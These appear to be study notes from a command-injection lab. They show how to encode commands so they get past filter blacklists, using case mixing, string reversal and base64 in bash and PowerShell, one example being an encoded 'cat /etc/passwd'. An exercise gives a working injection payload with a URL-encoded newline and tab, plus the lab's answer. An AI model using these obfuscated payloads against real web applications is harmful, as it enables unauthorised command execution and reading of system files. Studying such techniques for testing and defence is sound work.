Make sure to always encode with a `ctrl+u`
```bash
WhOaMi
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
echo 'whoami' | rev or $(rev<<<'imaohw')

# Different encoding
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# You can do the previous <<< instead of | since those are blacklisted operators
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```powershell
# Same can be done Windows
# Who am I command
iex "$('imaohw'[-1..-20] -join '')"

# Base64 encoding
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Decoding
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# Exercise 1
Do the following command `find /usr/share/ | grep root | grep mysql | tail -n 1`

```bash
echo -n  "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

# Now decoding it into burp.
127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

# Answer
/usr/share/mysql/debian_create_root_user.sql
```
